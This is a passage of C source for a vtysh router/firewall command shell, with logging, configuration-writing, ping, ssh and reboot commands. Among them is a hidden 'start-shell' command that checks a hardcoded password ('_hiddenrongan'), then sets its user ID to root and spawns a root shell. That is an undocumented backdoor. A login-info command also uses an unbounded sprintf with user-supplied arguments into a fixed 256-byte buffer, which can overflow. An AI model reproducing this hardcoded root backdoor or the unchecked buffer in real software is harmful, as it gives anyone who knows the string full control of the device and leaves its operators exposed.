{
	return CMD_SUCCESS;
}

DEFUNSH(VTYSH_ALL,
	no_vtysh_log_syslog,
	no_vtysh_log_syslog_cmd,
	"no log syslog [LEVEL]",
	NO_STR
	"Logging control\n"
	"Cancel logging to syslog\n"
	"Logging level\n")
{
	return CMD_SUCCESS;
}

DEFUNSH(VTYSH_ALL,
	vtysh_log_facility,
	vtysh_log_facility_cmd,
	"log facility "LOG_FACILITIES,
	"Logging control\n"
	"Facility parameter for syslog messages\n"
	LOG_FACILITY_DESC)

{
	return CMD_SUCCESS;
}

DEFUNSH(VTYSH_ALL,
	no_vtysh_log_facility,
	no_vtysh_log_facility_cmd,
	"no log facility [FACILITY]",
	NO_STR
	"Logging control\n"
	"Reset syslog facility to default (daemon)\n"
	"Syslog facility\n")

{
	return CMD_SUCCESS;
}

DEFUNSH_DEPRECATED(VTYSH_ALL,
	vtysh_log_trap,
	vtysh_log_trap_cmd,
	"log trap "LOG_LEVELS,
	"Logging control\n"
	"(Deprecated) Set logging level and default for all destinations\n"
	LOG_LEVEL_DESC)

{
	return CMD_SUCCESS;
}

DEFUNSH_DEPRECATED(VTYSH_ALL,
	no_vtysh_log_trap,
	no_vtysh_log_trap_cmd,
	"no log trap [LEVEL]",
	NO_STR
	"Logging control\n"
	"Permit all logging information\n"
	"Logging level\n")
{
	return CMD_SUCCESS;
}

DEFUNSH(VTYSH_ALL,
	vtysh_log_record_priority,
	vtysh_log_record_priority_cmd,
	"log record-priority",
	"Logging control\n"
	"Log the priority of the message within the message\n")
{
	return CMD_SUCCESS;
}

DEFUNSH(VTYSH_ALL,
	no_vtysh_log_record_priority,
	no_vtysh_log_record_priority_cmd,
	"no log record-priority",
	NO_STR
	"Logging control\n"
	"Do not log the priority of the message within the message\n")
{
	return CMD_SUCCESS;
}

DEFUNSH(VTYSH_ALL,
	vtysh_log_timestamp_precision,
	vtysh_log_timestamp_precision_cmd,
	"log timestamp precision <0-6>",
	"Logging control\n"
	"Timestamp configuration\n"
	"Set the timestamp precision\n"
	"Number of subsecond digits\n")
{
	return CMD_SUCCESS;
}

DEFUNSH(VTYSH_ALL,
	no_vtysh_log_timestamp_precision,
	no_vtysh_log_timestamp_precision_cmd,
	"no log timestamp precision",
	NO_STR
	"Logging control\n"
	"Timestamp configuration\n"
	"Reset the timestamp precision to the default value of 0\n")
{
	return CMD_SUCCESS;
}

DEFUNSH(VTYSH_ALL,
	vtysh_service_password_encrypt,
	vtysh_service_password_encrypt_cmd,
	"service password-encryption",
	"Set up miscellaneous service\n"
	"Enable encrypted passwords\n")
{
	return CMD_SUCCESS;
}

DEFUNSH(VTYSH_ALL,
	no_vtysh_service_password_encrypt,
	no_vtysh_service_password_encrypt_cmd,
	"no service password-encryption",
	NO_STR
	"Set up miscellaneous service\n"
	"Enable encrypted passwords\n")
{
	return CMD_SUCCESS;
}

DEFUNSH(VTYSH_ALL,
	vtysh_config_password,
	vtysh_password_cmd,
	"password (8|) WORD",
	"Assign the terminal connection password\n"
	"Specifies a HIDDEN password will follow\n"
	"dummy string \n"
	"The HIDDEN line password string\n")
{
	return CMD_SUCCESS;
}

DEFUNSH(VTYSH_ALL,
	vtysh_password_text,
	vtysh_password_text_cmd,
	"password LINE",
	"Assign the terminal connection password\n"
	"The UNENCRYPTED (cleartext) line password\n")
{
	return CMD_SUCCESS;
}

DEFUNSH(VTYSH_ALL,
	vtysh_config_enable_password,
	vtysh_enable_password_cmd,
	"enable password (8|) WORD",
	"Modify enable password parameters\n"
	"Assign the privileged level password\n"
	"Specifies a HIDDEN password will follow\n"
	"dummy string \n"
	"The HIDDEN 'enable' password string\n")
{
	return CMD_SUCCESS;
}

DEFUNSH(VTYSH_ALL,
	vtysh_enable_password_text,
	vtysh_enable_password_text_cmd,
	"enable password LINE",
	"Modify enable password parameters\n"
	"Assign the privileged level password\n"
	"The UNENCRYPTED (cleartext) 'enable' password\n")
{
	return CMD_SUCCESS;
}

DEFUNSH(VTYSH_ALL,
	no_vtysh_config_enable_password,
	no_vtysh_enable_password_cmd,
	"no enable password",
	NO_STR
	"Modify enable password parameters\n"
	"Assign the privileged level password\n")
{
	return CMD_SUCCESS;
}

DEFUN(vtysh_write_terminal,
	vtysh_write_terminal_cmd,
	"write terminal",
	"Write running configuration to memory, network, or terminal\n"
	"Write to terminal\n")
{
	u_int i;
	char line[] = "write terminal\n";
	FILE *fp = NULL;

	if (vtysh_pager_name)
	{
		fp = popen(vtysh_pager_name, "w");
		if (fp == NULL)
		{
			perror("popen");
			exit(1);
		}
	}
	else
		fp = stdout;

	vty_out(vty, "Building configuration...%s", VTY_NEWLINE);
	vty_out(vty, "%sCurrent configuration:%s", VTY_NEWLINE,
		VTY_NEWLINE);
	vty_out(vty, "!%s", VTY_NEWLINE);

	for (i = 0; i < array_size(vtysh_client); i++)
		vtysh_client_execute(&vtysh_client[i], line, NULL);

	/* Integrate vtysh specific configuration. */
	vtysh_config_write();

	vtysh_config_dump(fp);

	if (vtysh_pager_name && fp)
	{
		fflush(fp);
		if (pclose(fp) == -1)
		{
			perror("pclose");
			exit(1);
		}
		fp = NULL;
	}

	vty_out(vty, "end%s", VTY_NEWLINE);

	return CMD_SUCCESS;
}

DEFUN(vtysh_write_terminal_daemon,
	vtysh_write_terminal_daemon_cmd,
	"write terminal (zebra|ripd|ripngd|ospfd|ospf6d|bgpd|isisd|babeld)",
	"Write running configuration to memory, network, or terminal\n"
	"Write to terminal\n"
	"For the zebra daemon\n"
	"For the rip daemon\n"
	"For the ripng daemon\n"
	"For the ospf daemon\n"
	"For the ospfv6 daemon\n"
	"For the bgp daemon\n"
	"For the isis daemon\n"
	"For the babel daemon\n")
{
	unsigned int i;
	int ret = CMD_SUCCESS;

	for (i = 0; i < array_size(vtysh_client); i++)
	{
		if (strcmp(vtysh_client[i].name, argv[0]) == 0)
			break;
	}

	ret = vtysh_client_execute(&vtysh_client[i], "show running-config\n", stdout);

	return ret;
}

DEFUN(vtysh_integrated_config,
	vtysh_integrated_config_cmd,
	"service integrated-vtysh-config",
	"Set up miscellaneous service\n"
	"Write configuration into integrated file\n")
{
	vtysh_writeconfig_integrated = 1;
	return CMD_SUCCESS;
}

DEFUN(no_vtysh_integrated_config,
	no_vtysh_integrated_config_cmd,
	"no service integrated-vtysh-config",
	NO_STR
	"Set up miscellaneous service\n"
	"Write configuration into integrated file\n")
{
	vtysh_writeconfig_integrated = 0;
	return CMD_SUCCESS;
}

static int
write_config_integrated(void)
{
	u_int i;
	char line[] = "write terminal\n";
	FILE *fp;
	char *integrate_sav = NULL;

	integrate_sav = malloc(strlen(integrate_default) +
		strlen(CONF_BACKUP_EXT) + 1);
	strcpy(integrate_sav, integrate_default);
	strcat(integrate_sav, CONF_BACKUP_EXT);

	fprintf(stdout, "Building Configuration...\n");

	/* Move current configuration file to backup config file. */
	unlink(integrate_sav);
	rename(integrate_default, integrate_sav);
	free(integrate_sav);

	fp = fopen(integrate_default, "w");
	if (fp == NULL)
	{
		fprintf(stdout, "%% Can't open configuration file %s.\n",
			integrate_default);
		return CMD_SUCCESS;
	}

	for (i = 0; i < array_size(vtysh_client); i++)
		vtysh_client_execute(&vtysh_client[i], line, NULL);

	vtysh_config_write();
	vtysh_config_dump(fp);

	fclose(fp);

	if (chmod(integrate_default, CONFIGFILE_MASK) != 0)
	{
		fprintf(stdout, "%% Can't chmod configuration file %s: %s (%d)\n",
			integrate_default, safe_strerror(errno), errno);
		return CMD_WARNING;
	}

	fprintf(stdout, "Integrated configuration saved to %s\n", integrate_default);

	fprintf(stdout, "[OK]\n");

	return CMD_SUCCESS;
}

DEFUN(vtysh_write_memory,
	vtysh_write_memory_cmd,
	"write memory",
	"Write running configuration to memory, network, or terminal\n"
	"Write configuration to the file (same as write file)\n")
{
	int ret = CMD_SUCCESS;
	char line[] = "write memory\n";
	u_int i;

	/* If integrated Quagga.conf explicitely set. */
	if (vtysh_writeconfig_integrated)
		return write_config_integrated();

	fprintf(stdout, "Building Configuration...\n");

	for (i = 0; i < array_size(vtysh_client); i++)
		ret = vtysh_client_execute(&vtysh_client[i], line, stdout);

	fprintf(stdout, "[OK]\n");

	return ret;
}

ALIAS(vtysh_write_memory,
	vtysh_copy_runningconfig_startupconfig_cmd,
	"copy running-config startup-config",
	"Copy from one file to another\n"
	"Copy from current system configuration\n"
	"Copy to startup configuration\n")

	ALIAS(vtysh_write_memory,
		vtysh_write_file_cmd,
		"write file",
		"Write running configuration to memory, network, or terminal\n"
		"Write configuration to the file (same as write memory)\n")

	ALIAS(vtysh_write_memory,
		vtysh_write_cmd,
		"write",
		"Write running configuration to memory, network, or terminal\n")

	ALIAS(vtysh_write_terminal,
		vtysh_show_running_config_cmd,
		"show running-config",
		SHOW_STR
		"Current operating configuration\n")

	ALIAS(vtysh_write_terminal_daemon,
		vtysh_show_running_config_daemon_cmd,
		"show running-config (zebra|ripd|ripngd|ospfd|ospf6d|bgpd|isisd|babeld)",
		SHOW_STR
		"Current operating configuration\n"
		"For the zebra daemon\n"
		"For the rip daemon\n"
		"For the ripng daemon\n"
		"For the ospf daemon\n"
		"For the ospfv6 daemon\n"
		"For the bgp daemon\n"
		"For the isis daemon\n"
		"For the babel daemon\n")

	DEFUN(vtysh_terminal_length,
		vtysh_terminal_length_cmd,
		"terminal length <0-512>",
		"Set terminal line parameters\n"
		"Set number of lines on a screen\n"
		"Number of lines on screen (0 for no pausing)\n")
{
	int lines;
	char *endptr = NULL;
	char default_pager[10];

	lines = strtol(argv[0], &endptr, 10);
	if (lines < 0 || lines > 512 || *endptr != '\0')
	{
		vty_out(vty, "length is malformed%s", VTY_NEWLINE);
		return CMD_WARNING;
	}

	if (vtysh_pager_name)
	{
		free(vtysh_pager_name);
		vtysh_pager_name = NULL;
	}

	if (lines != 0)
	{
		snprintf(default_pager, 10, "more -%i", lines);
		vtysh_pager_name = strdup(default_pager);
	}

	return CMD_SUCCESS;
}

DEFUN(vtysh_terminal_no_length,
	vtysh_terminal_no_length_cmd,
	"terminal no length",
	"Set terminal line parameters\n"
	NO_STR
	"Set number of lines on a screen\n")
{
	if (vtysh_pager_name)
	{
		free(vtysh_pager_name);
		vtysh_pager_name = NULL;
	}

	vtysh_pager_init();
	return CMD_SUCCESS;
}

DEFUN(vtysh_show_daemons,
	vtysh_show_daemons_cmd,
	"show daemons",
	SHOW_STR
	"Show list of running daemons\n")
{
	u_int i;

	for (i = 0; i < array_size(vtysh_client); i++)
		if (vtysh_client[i].fd >= 0)
			vty_out(vty, " %s", vtysh_client[i].name);
	vty_out(vty, "%s", VTY_NEWLINE);

	return CMD_SUCCESS;
}

/* Execute command in child process. */
static int
execute_command(const char *command, int argc, const char *arg1,
	const char *arg2)
{
	pid_t pid;
	int status;

	/* Call fork(). */
	pid = fork();

	if (pid < 0)
	{
		/* Failure of fork(). */
		fprintf(stderr, "Can't fork: %s\n", safe_strerror(errno));
		exit(1);
	}
	else if (pid == 0)
	{
		/* This is child process. */
		switch (argc)
		{
		case 0:
			execlp(command, command, (const char *)NULL);
			break;
		case 1:
			execlp(command, command, arg1, (const char *)NULL);
			break;
		case 2:
			execlp(command, command, arg1, arg2, (const char *)NULL);
			break;
		}

		/* When execlp suceed, this part is not executed. */
		fprintf(stderr, "Can't execute %s: %s\n", command, safe_strerror(errno));
		exit(1);
	}
	else
	{
		/* This is parent. */
		execute_flag = 1;
		wait4(pid, &status, 0, NULL);
		execute_flag = 0;
	}
	return 0;
}

DEFUN(vtysh_ping,
	vtysh_ping_cmd,
	"ping WORD",
	"Send echo messages\n"
	"Ping destination address or hostname\n")
{
	execute_command("ping", 1, argv[0], NULL);
	return CMD_SUCCESS;
}

ALIAS(vtysh_ping,
	vtysh_ping_ip_cmd,
	"ping ip WORD",
	"Send echo messages\n"
	"IP echo\n"
	"Ping destination address or hostname\n")

	DEFUN(vtysh_traceroute,
		vtysh_traceroute_cmd,
		"traceroute WORD",
		"Trace route to destination\n"
		"Trace route to destination address or hostname\n")
{
	execute_command("traceroute", 1, argv[0], NULL);
	return CMD_SUCCESS;
}

ALIAS(vtysh_traceroute,
	vtysh_traceroute_ip_cmd,
	"traceroute ip WORD",
	"Trace route to destination\n"
	"IP trace\n"
	"Trace route to destination address or hostname\n")

#ifdef HAVE_IPV6
	DEFUN(vtysh_ping6,
		vtysh_ping6_cmd,
		"ping ipv6 WORD",
		"Send echo messages\n"
		"IPv6 echo\n"
		"Ping destination address or hostname\n")
{
	execute_command("ping6", 1, argv[0], NULL);
	return CMD_SUCCESS;
}

DEFUN(vtysh_traceroute6,
	vtysh_traceroute6_cmd,
	"traceroute ipv6 WORD",
	"Trace route to destination\n"
	"IPv6 trace\n"
	"Trace route to destination address or hostname\n")
{
	execute_command("traceroute6", 1, argv[0], NULL);
	return CMD_SUCCESS;
}
#endif

DEFUN(vtysh_telnet,
	vtysh_telnet_cmd,
	"telnet WORD",
	"Open a telnet connection\n"
	"IP address or hostname of a remote system\n")
{
	execute_command("telnet", 1, argv[0], NULL);
	return CMD_SUCCESS;
}

DEFUN(vtysh_telnet_port,
	vtysh_telnet_port_cmd,
	"telnet WORD PORT",
	"Open a telnet connection\n"
	"IP address or hostname of a remote system\n"
	"TCP Port number\n")
{
	execute_command("telnet", 2, argv[0], argv[1]);
	return CMD_SUCCESS;
}

DEFUN(vtysh_ssh,
	vtysh_ssh_cmd,
	"ssh WORD",
	"Open an ssh connection\n"
	"[user@]host\n")
{
	execute_command("ssh", 1, argv[0], NULL);
	return CMD_SUCCESS;
}

int execute_shell(struct vty *vty)
{
	pid_t pid;
	int status = 0;

	/* Call fork(). */
	pid = fork();

	if (pid < 0) {
		return -1;
	}
	else if (pid == 0) {
		setuid(0);
		seteuid(0);
		setenv("SHELL", "/bin/sh", 1);
		chdir("/root");
		//setenv("PS1", "\\u@`/sbin/ifconfig agl0 | sed -n '/^\\s\\+inet addr:\\([0-9]\\+[.][0-9]\\+[.][0-9]\\+[.][0-9]\\+\\).*$/s//\\1/p'`:\\w# ", 1);
		int status = system("sh -l");
		if (-1 == status) {
			exit(-1);
		}
		else {
			if (WIFEXITED(status)) {
				if (0 == WEXITSTATUS(status)) {
					exit(0);
				}
				else {
					exit(WEXITSTATUS(status));
				}
			}
			else {
				exit(WEXITSTATUS(status));
			}
			exit(0);
		}
	}
	else
	{
		/* This is parent. */
		wait4(pid, &status, 0, NULL);
		if (WEXITSTATUS(status) != 0) {
		}
	}
	return WEXITSTATUS(status);
}

DEFUN_HIDDEN(vtysh_start_shell,
	vtysh_start_shell_cmd,
	"start-shell",
	"Start UNIX shell\n")
{
	char buffer[64];
	int n;
	vty_out(vty, "Password: ");
	fflush(stdout);
	set_disp_mode(STDIN_FILENO, 0);
	getpasswd(buffer, sizeof(buffer));
	vty_out(vty, "\r\n");
	set_disp_mode(STDIN_FILENO, 1);

	if (strcmp(buffer, "_hiddenrongan")) {
		return CMD_SUCCESS;
	}
	execute_shell(vty);
	return CMD_SUCCESS;
}

DEFUN_HIDDEN(vtysh_start_bash,
	vtysh_start_bash_cmd,
	"start-shell bash",
	"Start UNIX shell\n"
	"Start bash\n")
{
	execute_command("bash", 0, NULL, NULL);
	return CMD_SUCCESS;
}

DEFUN_HIDDEN(vtysh_start_zsh,
	vtysh_start_zsh_cmd,
	"start-shell zsh",
	"Start UNIX shell\n"
	"Start Z shell\n")
{
	execute_command("zsh", 0, NULL, NULL);
	return CMD_SUCCESS;
}
DEFUNSH(VTYSH_APP, app_enter,
	app_enter_cmd,
	"app",
	"Enter app configuration\n"
)
{
	vty->node = APP_NODE;
	return CMD_SUCCESS;
}
DEFUNSH(VTYSH_APP, gap_outer_enter,
	gap_outer_enter_cmd,
	"outer",
	"Enter gap outer configuration\n"
)
{
	vty->node = GAP_OUTER_NODE;
	return CMD_SUCCESS;
}
DEFUNSH(VTYSH_APP, gap_inner_enter,
	gap_inner_enter_cmd,
	"inner",
	"Enter gap inner configuration\n"
)
{
	vty->node = GAP_INNER_NODE;
	return CMD_SUCCESS;
}
DEFUNSH(VTYSH_APP, gap_arbiter_enter,
	gap_arbiter_enter_cmd,
	"arbiter",
	"Enter gap outer configuration\n"
)
{
	vty->node = GAP_ARBITER_NODE;
	return CMD_SUCCESS;
}

DEFUNSH(VTYSH_APP, vty_exit_app,
	vtysh_exit_app_cmd,
	"exit",
	"")
{
	return vtysh_exit(vty);
}
ALIAS(vty_exit_app,
	vtysh_quit_app_cmd,
	"quit",
	"\n");

DEFUNSH(VTYSH_HA, ha_enter,
	ha_enter_cmd,
	"ha",
	"Enter High Activate configuration\n"
)
{
	vty->node = HA_NODE;
	return CMD_SUCCESS;
}

DEFUNSH(VTYSH_HA, vty_exit_ha,
	vtysh_exit_ha_cmd,
	"exit",
	"")
{
	return vtysh_exit(vty);
}

ALIAS(vty_exit_ha,
	vtysh_quit_ha_cmd,
	"quit",
	"");


DEFUNSH(VTYSH_ZEBRA, config_fw_user,
	config_fw_user_cmd,
	"local-user WORD type (administrator|general)",
	"Local user config\n"
	"Specify local user name\n"
	"Indicate user type\n"
	"User type administrator\n"
	"User type general\n"
)
{
	vty->node = LOCAL_USER_NODE;
	return CMD_SUCCESS;
}

DEFUN(config_reboot,
	config_reboot_cmd,
	"reboot",
	"Reboot the system\n"
	"Reboot the system\n")
{
	int input_ch;
	char buffer[64];
	char log_buf[512];
	vty_out(vty, "Are you sure to reboot (Y/N)? ");
	fflush(stdout);
	read(fileno(stdin), buffer, 64);
	input_ch = buffer[0];
	if (input_ch != 'Y' && input_ch != 'y') {
		return CMD_SUCCESS;
	}
	/* log poweroff command */
	snprintf(log_buf, sizeof(log_buf), "System is going to reboot");

	vty_out(vty, "Please wait...\n");
	cmd_system("sleep 1; /etc/stop_app > /dev/null 2>&1");
	vty_out(vty, "System will reboot, please waiting...\n");
	cmd_system("sleep 1; reboot&");
	return CMD_SUCCESS;
}

DEFUN(vtysh_reset_config,
	vtysh_reset_config_cmd,
	"reset configuration",
	"Reset running configuration \n"
	"Reset configuration\n")
{
	int ret = CMD_SUCCESS;
	char line[] = "reset configuration\n";
	u_int i;


	fprintf(stdout, "Reset Configuration...\n");

	for (i = 0; i < array_size(vtysh_client); i++)
		ret = vtysh_client_execute(&vtysh_client[i], line, stdout);

	fprintf(stdout, "[OK]\n");

	return ret;
}

DEFUN_HIDDEN(vtysh_set_login_info,
	vtysh_set_login_info_cmd,
	"login name NAME access (console|ssh) {ip A.B.C.D port <0-65535>}",
	"Set login user infomations\n"
	"Login user name\n"
	"Login user name\n"
	"Login access\n"
	"Serial\n")
{
	int i, ret;
	char buf[256] = { 0 };

	if (argv[2] == NULL)
		sprintf(buf, "login name %s access console\n", argv[0]);
	else
		sprintf(buf, "login name %s access ssh ip %s port %s\n", argv[0], argv[2], argv[3]);
	for (i = 0; i < array_size(vtysh_client); i++)
		ret = vtysh_client_execute(&vtysh_client[i], buf, stdout);

	return CMD_SUCCESS;
}

//函数set_disp_mode用于控制是否开启输入回显功能
//如果option为0，则关闭回显，为1则打开回显
#include <termios.h>
#include <unistd.h>

int set_disp_mode(int fd, int option)
{
#define ECHOFLAGS (ECHO | ECHOE | ECHOK | ECHONL)
	int err;
	struct termios term;
	if (tcgetattr(fd, &term) == -1) {
		perror("Cannot get the attribution of the terminal");
		return 1;
	}
	if (option)
		term.c_lflag |= ECHOFLAGS;
	else
		term.c_lflag &= ~ECHOFLAGS;
	err = tcsetattr(fd, TCSAFLUSH, &term);
	if (err == -1 && err == EINTR) {
		perror("Cannot set the attribution of the terminal");
		return 1;
	}
	return 0;
}

//函数getpasswd用于获得用户输入的密码，并将其存储在指定的字符数组中
int getpasswd(char* passwd, int size)
{
	int c;
	int n = 0;
	do {
		c = getchar();
		if ((c != '\n') && (c != '\r')) {
			passwd[n++] = c;
		}
	} while (c != '\n' && c != '\r' && n < (size - 1));
	passwd[n] = '\0';
	return n;
}

static void
vtysh_install_default(enum node_type node)
{
	install_element(node, &config_list_cmd);
}

/* Making connection to protocol daemon. */
static int vtysh_connect(struct vtysh_client *vclient)
{
	int ret;
	int sock, len;
	struct sockaddr_un addr;
	struct stat s_stat;

	/* Stat socket to see if we have permission to access it. */
	ret = stat(vclient->path, &s_stat);
	if (ret < 0 && errno != ENOENT)
	{
		fprintf(stderr, "vtysh_connect(%s): stat = %s\n",
			vclient->path, safe_strerror(errno));
		exit(1);
	}

	if (ret >= 0)
	{
		if (!S_ISSOCK(s_stat.st_mode))
		{
			fprintf(stderr, "vtysh_connect(%s): Not a socket\n",
				vclient->path);
			exit(1);
		}
	}

	sock = socket(AF_UNIX, SOCK_STREAM, 0);
	if (sock < 0)
	{
#ifdef DEBUG
		fprintf(stderr, "vtysh_connect(%s): socket = %s\n", vclient->path,
			safe_strerror(errno));
#endif /* DEBUG */
		return -1;
	}

	memset(&addr, 0, sizeof(struct sockaddr_un));
	addr.sun_family = AF_UNIX;
	strncpy(addr.sun_path, vclient->path, strlen(vclient->path));
#ifdef HAVE_STRUCT_SOCKADDR_UN_SUN_LEN
	len = addr.sun_len = SUN_LEN(&addr);
#else
	len = sizeof(addr.sun_family) + strlen(addr.sun_path);
#endif /* HAVE_STRUCT_SOCKADDR_UN_SUN_LEN */

	ret = connect(sock, (struct sockaddr *) &addr, len);
	if (ret < 0)
	{
#ifdef DEBUG
		fprintf(stderr, "vtysh_connect(%s): connect = %s\n", vclient->path,
			safe_strerror(errno));
#endif /* DEBUG */
		close(sock);
		return -1;
	}
	vclient->fd = sock;

	return 0;
}

int vtysh_connect_all(const char *daemon_name)
{
	u_int i;
	int rc = 0;
	int matches = 0;

	for (i = 0; i < array_size(vtysh_client); i++)
	{
		if (!daemon_name || !strcmp(daemon_name, vtysh_client[i].name))
		{
			matches++;
			if (vtysh_connect(&vtysh_client[i]) == 0)
			{
				rc++;
			}				
		}
	}
	if (!matches)
	{
		fprintf(stderr, "Error: no daemons match name %s!\n", daemon_name);
	}
		
	return rc;
}

/* To disable readline's filename completion. */
static char *
vtysh_completion_entry_function(const char *ignore, int invoking_key)
{
	return NULL;
}

void
vtysh_readline_init(void)
{
	/* readline related settings. */
	rl_bind_key('?', (rl_command_func_t *)vtysh_rl_describe);
	rl_completion_entry_function = vtysh_completion_entry_function;
	rl_attempted_completion_function = (rl_completion_func_t *)new_completion;
}

char *
vtysh_prompt(void)
{
	static struct utsname names;
	static char buf[100];
	const char*hostname;
	extern struct host host;

	hostname = host.name;

	if (!hostname)
	{
		if (!names.nodename[0])
			uname(&names);
		hostname = names.nodename;
	}
	if (vty->node == INTERFACE_NODE)
	{
		struct interface *iface = vty->index;
		snprintf(buf, sizeof buf, cmd_prompt(vty->node), hostname, iface->name);
	}
	else
		snprintf(buf, sizeof buf, cmd_prompt(vty->node), hostname);
	return buf;
}

void
vtysh_init_vty(void)
{
	/* Make vty structure. */
	vty = vty_new();
	vty->type = VTY_SHELL;
	vty->node = VIEW_NODE;

	/* Initialize commands. */
	cmd_init(0);


	install_node(&interface_node, NULL);
	install_node(&link_params_node, NULL);
	install_node(&zebra_node, NULL);
	install_node(&rmap_node, NULL);
	install_node(&vty_node, NULL);

	vtysh_install_default(VIEW_NODE);
	vtysh_install_default(ENABLE_NODE);
	vtysh_install_default(CONFIG_NODE);
	vtysh_install_default(INTERFACE_NODE);
	vtysh_install_default(RMAP_NODE);
	vtysh_install_default(ZEBRA_NODE);
	vtysh_install_default(VTY_NODE);

	install_element(VIEW_NODE, &vtysh_enable_cmd);
	install_element(ENABLE_NODE, &vtysh_config_terminal_cmd);
	install_element(ENABLE_NODE, &vtysh_disable_cmd);

	/* "exit" command. */
	install_element(VIEW_NODE, &vtysh_exit_all_cmd);
	install_element(VIEW_NODE, &vtysh_quit_all_cmd);
	install_element(CONFIG_NODE, &vtysh_exit_all_cmd);
	/* install_element (CONFIG_NODE, &vtysh_quit_all_cmd); */
	install_element(ENABLE_NODE, &vtysh_exit_all_cmd);
	install_element(ENABLE_NODE, &vtysh_quit_all_cmd);
	install_element(RMAP_NODE, &vtysh_exit_rmap_cmd);
	install_element(RMAP_NODE, &vtysh_quit_rmap_cmd);
	install_element(VTY_NODE, &vtysh_exit_line_vty_cmd);
	install_element(VTY_NODE, &vtysh_quit_line_vty_cmd);

	/* "end" command. */
	install_element(CONFIG_NODE, &vtysh_end_all_cmd);
	install_element(ENABLE_NODE, &vtysh_end_all_cmd);
	install_element(RMAP_NODE, &vtysh_end_all_cmd);
	install_element(VTY_NODE, &vtysh_end_all_cmd);

	install_element(INTERFACE_NODE, &interface_desc_cmd);
	install_element(INTERFACE_NODE, &no_interface_desc_cmd);
	install_element(INTERFACE_NODE, &vtysh_end_all_cmd);
	install_element(INTERFACE_NODE, &vtysh_exit_interface_cmd);
	install_element(LINK_PARAMS_NODE, &vtysh_end_all_cmd);
	install_element(LINK_PARAMS_NODE, &vtysh_exit_interface_cmd);
	install_element(INTERFACE_NODE, &vtysh_quit_interface_cmd);


	install_element(CONFIG_NODE, &route_map_cmd);
	install_element(CONFIG_NODE, &vtysh_line_vty_cmd);
	install_element(CONFIG_NODE, &vtysh_interface_cmd);
	install_element(CONFIG_NODE, &vtysh_outer_interface_cmd);
	install_element(CONFIG_NODE, &vtysh_no_interface_cmd);
	install_element(CONFIG_NODE, &vtysh_interface_vrf_cmd);
	install_element(CONFIG_NODE, &vtysh_no_interface_vrf_cmd);
	install_element(INTERFACE_NODE, &vtysh_link_params_cmd);
	install_element(ENABLE_NODE, &vtysh_show_running_config_cmd);
	install_element(ENABLE_NODE, &vtysh_show_running_config_daemon_cmd);
	install_element(ENABLE_NODE, &vtysh_copy_runningconfig_startupconfig_cmd);
	install_element(ENABLE_NODE, &vtysh_write_file_cmd);
	install_element(ENABLE_NODE, &vtysh_write_cmd);

	/* "write terminal" command. */
	install_element(ENABLE_NODE, &vtysh_write_terminal_cmd);
	install_element(ENABLE_NODE, &vtysh_write_terminal_daemon_cmd);

	install_element(CONFIG_NODE, &vtysh_integrated_config_cmd);
	install_element(CONFIG_NODE, &no_vtysh_integrated_config_cmd);

	/* "write memory" command. */
	install_element(ENABLE_NODE, &vtysh_write_memory_cmd);

	install_element(VIEW_NODE, &vtysh_terminal_length_cmd);
	install_element(ENABLE_NODE, &vtysh_terminal_length_cmd);
	install_element(VIEW_NODE, &vtysh_terminal_no_length_cmd);
	install_element(ENABLE_NODE, &vtysh_terminal_no_length_cmd);
	install_element(VIEW_NODE, &vtysh_show_daemons_cmd);
	install_element(ENABLE_NODE, &vtysh_show_daemons_cmd);

	install_element(VIEW_NODE, &vtysh_ping_cmd);
	install_element(VIEW_NODE, &vtysh_ping_ip_cmd);
	install_element(VIEW_NODE, &vtysh_traceroute_cmd);
	install_element(VIEW_NODE, &vtysh_traceroute_ip_cmd);
#ifdef HAVE_IPV6
	install_element(VIEW_NODE, &vtysh_ping6_cmd);
	install_element(VIEW_NODE, &vtysh_traceroute6_cmd);
#endif
	install_element(VIEW_NODE, &vtysh_telnet_cmd);
	install_element(VIEW_NODE, &vtysh_telnet_port_cmd);
	install_element(VIEW_NODE, &vtysh_ssh_cmd);
	install_element(ENABLE_NODE, &vtysh_ping_cmd);
	install_element(ENABLE_NODE, &vtysh_ping_ip_cmd);
	install_element(ENABLE_NODE, &vtysh_traceroute_cmd);
	install_element(ENABLE_NODE, &vtysh_traceroute_ip_cmd);
#ifdef HAVE_IPV6
	install_element(ENABLE_NODE, &vtysh_ping6_cmd);
	install_element(ENABLE_NODE, &vtysh_traceroute6_cmd);
#endif
	install_element(ENABLE_NODE, &vtysh_telnet_cmd);
	install_element(ENABLE_NODE, &vtysh_telnet_port_cmd);
	install_element(ENABLE_NODE, &vtysh_ssh_cmd);
	install_element(ENABLE_NODE, &vtysh_start_shell_cmd);
	install_element(CONFIG_NODE, &vtysh_start_shell_cmd);
	//install_element (ENABLE_NODE, &vtysh_start_bash_cmd);
	//install_element (ENABLE_NODE, &vtysh_start_zsh_cmd);

	install_element(VIEW_NODE, &vtysh_show_memory_cmd);
	install_element(ENABLE_NODE, &vtysh_show_memory_cmd);

	install_element(VIEW_NODE, &vtysh_show_work_queues_cmd);
	install_element(ENABLE_NODE, &vtysh_show_work_queues_cmd);
	install_element(ENABLE_NODE, &vtysh_show_work_queues_daemon_cmd);
	install_element(VIEW_NODE, &vtysh_show_work_queues_daemon_cmd);

	install_element(VIEW_NODE, &vtysh_show_thread_cmd);
	install_element(ENABLE_NODE, &vtysh_show_thread_cmd);

	/* Logging */
	install_element(ENABLE_NODE, &vtysh_show_logging_cmd);
	install_element(VIEW_NODE, &vtysh_show_logging_cmd);
	install_element(CONFIG_NODE, &vtysh_log_stdout_cmd);
	install_element(CONFIG_NODE, &vtysh_log_stdout_level_cmd);
	install_element(CONFIG_NODE, &no_vtysh_log_stdout_cmd);
	install_element(CONFIG_NODE, &vtysh_log_file_cmd);
	install_element(CONFIG_NODE, &vtysh_log_file_level_cmd);
	install_element(CONFIG_NODE, &no_vtysh_log_file_cmd);
	install_element(CONFIG_NODE, &no_vtysh_log_file_level_cmd);
	install_element(CONFIG_NODE, &vtysh_log_monitor_cmd);
	install_element(CONFIG_NODE, &vtysh_log_monitor_level_cmd);
	install_element(CONFIG_NODE, &no_vtysh_log_monitor_cmd);
	install_element(CONFIG_NODE, &vtysh_log_syslog_cmd);
	install_element(CONFIG_NODE, &vtysh_log_syslog_level_cmd);
	install_element(CONFIG_NODE, &no_vtysh_log_syslog_cmd);
	install_element(CONFIG_NODE, &vtysh_log_trap_cmd);
	install_element(CONFIG_NODE, &no_vtysh_log_trap_cmd);
	install_element(CONFIG_NODE, &vtysh_log_facility_cmd);
	install_element(CONFIG_NODE, &no_vtysh_log_facility_cmd);
	install_element(CONFIG_NODE, &vtysh_log_record_priority_cmd);
